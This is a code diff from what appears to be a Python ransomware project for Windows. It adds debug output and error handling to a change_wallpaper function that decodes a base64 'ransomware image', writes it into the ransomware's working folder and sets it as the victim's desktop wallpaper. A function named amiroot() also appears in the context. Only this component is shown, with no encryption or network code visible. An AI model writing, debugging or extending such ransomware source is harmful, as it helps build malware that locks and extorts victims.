@@ -47,14 +47,25 @@ def amiroot():
 def change_wallpaper():
     """Change desktop wallpaper on Windows"""
     try:
-        # Check if we have base64 encoded image in variables
+        print("Checking for wallpaper image...")
+        print(f"variables.img exists: {hasattr(variables, 'img')}")
+        print(f"variables.img length: {len(variables.img) if hasattr(variables, 'img') else 0}")
+        
         if hasattr(variables, 'img') and variables.img:
-            # Save the ransomware image from base64
+            print("Using base64 image from variables")
             wallpaper_path = os.path.join(variables.ransomware_path, "img.png")
+            print(f"Creating wallpaper at: {wallpaper_path}")
             os.makedirs(os.path.dirname(wallpaper_path), exist_ok=True)
             
-            with open(wallpaper_path, 'wb') as f:
-                f.write(base64.b64decode(variables.img))
+            # Add more verbose error handling
+            try:
+                decoded_data = base64.b64decode(variables.img)
+                print(f"Successfully decoded {len(decoded_data)} bytes of image data")
+                with open(wallpaper_path, 'wb') as f:
+                    f.write(decoded_data)
+                print(f"Image written to {wallpaper_path}")
+            except Exception as e:
+                print(f"Error decoding/writing image: {str(e)}")
         else:
             # Look for existing image file in current directory
             script_dir = os.path.dirname(os.path.abspath(__file__))
